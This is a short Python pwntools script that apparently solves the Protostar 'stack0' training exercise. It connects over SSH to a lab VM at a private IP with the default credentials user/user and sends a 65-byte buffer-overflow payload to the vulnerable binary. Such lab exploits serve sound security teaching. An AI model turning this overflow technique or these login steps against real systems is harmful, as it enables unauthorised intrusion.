from pwn import *


#  IP OF THE VM 192.168.160.128
# location of the binary /opt/protostar/bin/stack0



remote_ssh =  ssh(host='192.168.160.128', user='user', password='user')

re_process = remote_ssh.run(['/opt/protostar/bin/stack0'])

payload=b'A'*65 
re_process.sendline(payload)

print(re_process.recvline())

re_process.close()

